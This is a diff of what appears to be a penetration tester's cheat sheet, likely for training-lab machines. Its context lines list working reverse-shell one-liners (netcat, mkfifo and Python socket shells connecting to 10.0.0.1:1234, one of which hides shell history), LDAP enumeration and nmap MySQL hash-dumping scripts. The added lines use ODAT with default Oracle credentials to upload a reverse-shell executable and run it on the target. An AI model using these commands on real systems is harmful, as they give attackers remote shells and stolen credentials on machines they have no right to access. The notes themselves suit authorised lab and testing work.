@@ -8,7 +8,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 {nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
 root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
-one-liner
+one-lin3r
 
 #Upgrade to PTY
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -90,7 +90,10 @@ ldapsearch -h 10.10.10.97 -x -s base namingcontexts
 ldapsearch -h 10.10.10.97 -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
 
 #Oracle 1521
-cd odat && python 3 odat.py all -s 10.10.10.97 -p 1521
+python3 odat.py all -s 10.10.10.97 -p 1521
+mv ../www/shells/x64/rev-1234.exe .
+python3 odat.py utlfile -s 10.10.10.97 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ rev-1234.exe rev-1234.exe
+python3 odat.py externaltable -s 10.10.10.97 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ rev-1234.exe
 
 #MySQL 3306
 nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.97 -p 3306
